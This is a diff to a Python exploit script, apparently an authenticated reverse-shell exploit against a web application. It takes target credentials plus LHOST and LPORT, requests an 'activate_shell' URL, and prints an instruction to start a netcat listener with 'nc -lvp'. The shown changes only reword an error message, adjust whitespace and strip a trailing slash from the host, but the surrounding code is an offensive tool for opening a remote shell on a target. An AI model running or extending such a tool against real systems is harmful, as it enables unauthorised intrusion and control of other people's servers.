@@ -41,7 +41,7 @@ def logo():
     banner += "─────▀█▀█▀\n"
 
     return banner
-    
+
 
 class Script:
 
@@ -127,7 +127,7 @@ class Script:
                 session.get(url=self.activate_shell, verify=False, timeout=30)
 
             except AttributeError:
-                print("[!] Just remove the character: '/' in the end or check the URL" + "\n")
+                print("[!] Remove the characters after forward slash: '/' or check the URL" + "\n")
                 exit()
 
         else:
@@ -181,6 +181,11 @@ if __name__ == '__main__':
     try:
         if host is not None and username_value is not None and password_value is not None \
             and LHOST is not None and LPORT is not None:
+
+            if host[-1] == "/":
+                host = host[:-1]
+            else:
+                pass
 
             print(logo())
             print(f"[!] ---> execute [nc -lvp {LPORT}]\n")
